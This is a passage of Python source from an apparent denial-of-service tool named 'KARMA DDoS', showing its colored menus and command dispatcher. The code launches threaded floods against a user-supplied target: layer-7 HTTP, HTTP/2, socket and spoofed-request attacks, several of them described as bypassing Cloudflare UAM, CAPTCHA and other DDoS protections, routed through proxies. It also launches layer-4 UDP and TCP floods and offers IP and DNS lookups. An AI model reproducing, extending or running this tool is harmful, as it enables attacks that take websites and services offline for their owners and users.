    stdout.write("                                                                                         \n")
    stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"  ╦ ╦╔═╗╦  ╔═╗             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"  ╠═╣║╣ ║  ╠═╝             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"  ╩ ╩╚═╝╩═╝╩                \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"layer7   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show Layer7 Methods                    "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"layer4   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show Layer4 Methods                    "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tools    "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show tools                             "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"credit   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show credit                            "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"exit     "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Exit KARMA DDoS                        "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╠═════════════════════════════════════════════════════╣\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"THANK    "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Thanks for using KARMA.                "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"YOU♥     "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Plz star project :)                    "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"github   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" github.com/HyukIsBack/KARMA-DDoS       "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def credit():
    stdout.write("\x1b[38;2;0;236;250m════════════════════════╗\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Developer "+Fore.RED+": \x1b[38;2;0;255;189mHyuk\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"UI Design "+Fore.RED+": \x1b[38;2;0;255;189mYone不\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Methods/Tools "+Fore.RED+": \x1b[38;2;0;255;189mSkyWtkh\n")
    stdout.write("\x1b[38;2;0;236;250m════════════════════════╝\n")
    stdout.write("\n")    
##############################################################################################
def layer7():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"╦  ╔═╗╦ ╦╔═╗╦═╗ ══╗             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"║  ╠═╣╚╦╝║╣ ╠╦╝  ╔╝             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩              \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"╔══════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfb    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF Attack                         "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxcfb  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF Attack With Proxy              "+Fore.LIGHTCYAN_EX+"║\n")                  
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfreq  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (request)    "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfsoc  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (socket)     "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxsky  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass Google Project Shield, Vshield,   "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m  "+Fore.LIGHTWHITE_EX+"       "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" DDoS Guard Free, CF NoSec With Proxy     "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"sky    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Sky method without proxy                 "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"http2  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" HTTP 2.0 Request Attack                  "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxhttp2"+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" HTTP 2.0 Request Attack With Proxy       "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"get    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Get Request Attack                       "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"post   "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Post Request Attack                      "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"head   "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Head Request Attack                      "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pps    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Only GET / HTTP/1.1                      "+Fore.LIGHTCYAN_EX+"║\n")
    
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"spoof  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" HTTP Spoof Socket Attack                 "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxspoof"+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" HTTP Spoof Socket Attack With Proxy      "+Fore.LIGHTCYAN_EX+"║\n")
    
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"soc    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Socket Attack                            "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxraw  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Proxy Request Attack                     "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxsoc  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Proxy Socket Attack                      "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"╚══════════════════════════════════════════════════════╝\n") 
    stdout.write("\n")
##############################################################################################
def layer4():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩              \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"udp   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" UDP Attack                                "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tcp   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" TCP Attack                                "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n") 
    stdout.write("\n")
##############################################################################################
def tools():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"╔╦╗╔═╗╔═╗╦  ╔═╗             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +" ║ ║ ║║ ║║  ╚═╗             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +" ╩ ╚═╝╚═╝╩═╝╚═╝             \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"geoip "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Geo IP Address Lookup"+Fore.LIGHTCYAN_EX+"                     ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"dns   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Classic DNS Lookup   "+Fore.LIGHTCYAN_EX+"                     ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"subnet"+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Subnet IP Address Lookup   "+Fore.LIGHTCYAN_EX+"               ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n") 
    stdout.write("\n")
##############################################################################################
def title():
    stdout.write("                                                                                          \n")
    stdout.write("                                 "+Fore.LIGHTWHITE_EX  +"╦╔═╔═╗╦═╗╔╦╗╔═╗                 \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX   +"╠╩╗╠═╣╠╦╝║║║╠═╣                 \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX   +"╩ ╩╩ ╩╩╚═╩ ╩╩ ╩                \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTWHITE_EX   +"        Welcome To The Main Screen Of Karma  "+Fore.LIGHTCYAN_EX  +"       ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTWHITE_EX   +"          Type [help] to see the Commands    "+Fore.LIGHTCYAN_EX +"       ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTWHITE_EX   +"         Contact Dev - Telegram @zjfoq394   "+Fore.LIGHTCYAN_EX +"        ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################

def command():
    stdout.write(Fore.LIGHTCYAN_EX+"╔═══"+Fore.LIGHTCYAN_EX+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.LIGHTCYAN_EX+"Karma"+Fore.CYAN+"]"+Fore.LIGHTCYAN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
    command = input()
    if command == "cls" or command == "clear":
        clear()
        title()
    elif command == "help" or command == "?":
        help()
    elif command == "credit":
        credit()        
    elif command == "layer7" or command == "LAYER7" or command == "l7" or command == "L7" or command == "Layer7":
        layer7()
    elif command == "layer4" or command == "LAYER4" or command == "l4" or command == "L4" or command == "Layer4":
        layer4()
    elif command == "tools" or command == "tool":
        tools()
    elif command == "exit":
        exit()
    elif command == "test":
        target, thread, t = get_info_l7()
        test1(target, thread, t)
        time.sleep(10)
    elif command == "http2" or command == "HTTP2":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHTTP2(target, thread, t)
        timer.join()
    elif command == "pxhttp2" or command == "PXHTTP2":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXHTTP2(target, thread, t)
            timer.join()
    elif command == "cfb" or command == "CFB":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif command == "pxcfb" or command == "PXCFB":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXCFB(target, thread, t)
            timer.join()
    elif command == "pps" or command == "PPS":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPPS(target, thread, t)
        timer.join() 
    elif command == "spoof" or command == "SPOOF":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSPOOF(target, thread, t)
        timer.join() 
    elif command == "pxspoof" or command == "PXSPOOF":
        target, thread, t = get_info_l7()
        #timer = threading.Thread(target=countdown, args=(t,))
        #timer.start()
        LaunchPXSPOOF(target, thread, t, get_proxylist("SOCKS5"))
        #timer.join()
        time.sleep(1000)
    elif command == "get" or command == "GET":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchRAW(target, thread, t)
        timer.join()
    elif command == "post" or command == "POST":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPOST(target, thread, t)
        timer.join()
    elif command == "head" or command == "HEAD":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHEAD(target, thread, t)
        timer.join()
    elif command == "pxraw" or command == "PXRAW":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXRAW(target, thread, t)
            timer.join()
    elif command == "soc" or command == "SOC":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()
    elif command == "pxsoc" or command == "PXSOC":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXSOC(target, thread, t)
            timer.join()
    elif command == "cfreq" or command == "CFREQ":
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFPRO(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif command == "cfsoc" or command == "CFSOC":
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFSOC(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif command == "pxsky" or command == "PXSKY":
        if get_proxies():
            target, thread, t = get_info_l7()
            threading.Thread(target=attackSKY, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif command == "sky" or command == "SKY":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "udp" or command == "UDP":
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runsender, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "tcp" or command == "TCP":
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()

##############################################################################################     
    elif command == "subnet":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')                   
            
    elif command == "dns":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP/DOMAIN "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
            
    elif command == "geoip":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/geoip/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
    else:
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. type 'help' to see all commands.\n")  
##############################################################################################   

def func():
    stdout.write(Fore.RED+" [\x1b[38;2;0;255;189mLAYER 7"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfb        "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxcfb      "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack with proxy\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfpro      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfsoc      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n")
#    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"sky        "+Fore.RED+": "+Fore.WHITE+"HTTPS Flood and bypass for CF NoSec, DDoS Guard Free and vShield\n")
#    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"stellar    "+Fore.RED+": "+Fore.WHITE+"HTTPS Sky method without proxies\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"raw        "+Fore.RED+": "+Fore.WHITE+"Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"post       "+Fore.RED+": "+Fore.WHITE+"Post Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"head       "+Fore.RED+": "+Fore.WHITE+"Head Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"soc        "+Fore.RED+": "+Fore.WHITE+"Socket attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxraw      "+Fore.RED+": "+Fore.WHITE+"Proxy Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxsoc      "+Fore.RED+": "+Fore.WHITE+"Proxy Socket attack\n")
    
    #stdout.write(Fore.RED+" \n["+Fore.WHITE+"LAYER 4"+Fore.RED+"]\n")
    #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"tcp        "+Fore.RED+": "+Fore.WHITE+"Strong TCP attack (not supported)\n")
    #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"udp        "+Fore.RED+": "+Fore.WHITE+"Strong UDP attack (not supported)\n")

    stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mTOOLS"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"dns        "+Fore.RED+": "+Fore.WHITE+"Classic DNS Lookup\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"geoip      "+Fore.RED+": "+Fore.WHITE+"Geo IP Address Lookup\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"subnet     "+Fore.RED+": "+Fore.WHITE+"Subnet IP Address Lookup\n")
    
    stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mOTHER"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"clear/cls  "+Fore.RED+": "+Fore.WHITE+"Clear console\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"exit       "+Fore.RED+": "+Fore.WHITE+"Bye..\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"credit     "+Fore.RED+": "+Fore.WHITE+"Thanks for\n")

if __name__ == '__main__':
    init(convert=True)
    if len(sys.argv) < 2:
        ua = open('./resources/ua.txt', 'r').read().split('\n')
        clear()
        title()
        while True:
            command()
    elif len(sys.argv) == 5:
        pass
    else:
        stdout.write("Method: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
        stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
        sys.exit()
    ua = open('./resources/ua.txt', 'r').read().split('\n')
    method = sys.argv[1].rstrip()
    target = sys.argv[2].rstrip()
    thread = sys.argv[3].rstrip()
    t      = sys.argv[4].rstrip()
    if method == "cfb":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif method == "pxcfb":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXCFB(target, thread, t)
            timer.join()
    elif method == "get":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchRAW(target, thread, t)
        timer.join()
    elif method == "post":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPOST(target, thread, t)
        timer.join()
    elif method == "head":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHEAD(target, thread, t)
        timer.join()
    elif method == "pxraw":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXRAW(target, thread, t)
            timer.join()
    elif method == "soc":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()
    elif method == "pxsoc":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXSOC(target, thread, t)
            timer.join()
    elif method == "cfreq":
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFPRO(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif method == "cfsoc":
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFSOC(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif method == "http2":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHTTP2(target, thread, t)
        timer.join()
    elif method == "pxhttp2":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXHTTP2(target, thread, t)
            timer.join()
    elif method == "pxsky":
        if get_proxies():
            target, thread, t = get_info_l7()
            threading.Thread(target=attackSKY, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif method == "sky":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    else:
        stdout.write("No method found.\nMethod: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
